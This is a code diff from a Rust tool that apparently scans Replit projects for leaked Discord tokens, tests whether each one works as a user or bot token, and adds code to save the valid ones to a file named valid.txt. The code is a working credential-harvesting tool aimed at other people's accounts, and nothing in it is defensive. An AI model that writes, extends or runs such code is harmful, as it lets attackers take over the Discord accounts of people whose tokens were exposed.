@@ -4,6 +4,8 @@ use repl::Replit;
 use std::sync::Arc;
 use futures::{stream::futures_unordered::FuturesUnordered, StreamExt};
 use std::io;
+use tokio::fs::OpenOptions;
+use tokio::io::AsyncWriteExt;
 
 #[tokio::main()]
 async fn main() {
@@ -57,12 +59,25 @@ https://discord.gg/qCJwVERPRV\x1b[0m");
         let mut token = repl.search_extract(zip).await;
         tokens.append(&mut token);
     }
-    // Check selfbot tokens
-    
+    // Check Selfbot tokens
+    let mut file_writer = OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open("valid.txt")
+        .await.unwrap();
+    file_writer.write_all(format!("Self:\n").as_bytes()).await.unwrap();
     let mut futs = FuturesUnordered::new();
     for token in tokens.clone() {
         futs.push(repl.self_check_tokens(client.clone(), token.clone()));
     }
+
+    // Check Bot tokens
+    let mut file_writer = OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open("valid.txt")
+        .await.unwrap();
+    file_writer.write_all(format!("Bot:\n").as_bytes()).await.unwrap();
     while let Some(_) = futs.next().await {}
     let mut futs = FuturesUnordered::new();
     for token in tokens {
